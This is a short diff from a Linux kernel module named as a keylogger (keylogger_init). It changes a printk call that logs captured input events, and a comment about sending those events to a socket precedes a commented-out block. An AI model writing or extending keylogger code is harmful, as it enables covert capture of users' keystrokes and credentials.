@@ -37,7 +37,7 @@ static int __init keylogger_init(void) {
 
         }
 
-        printk(KERN_INFO "Time: %ld.%06ld\tType: %d\tCode: %d\tValue: %d\n", ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);     // Print the input event
+        printk(KERN_INFO "Type: %d\tCode: %d\tValue: %d\n",  ie.type, ie.code, ie.value);     // Print the input event
 
         // Send the input event to socket
         /*
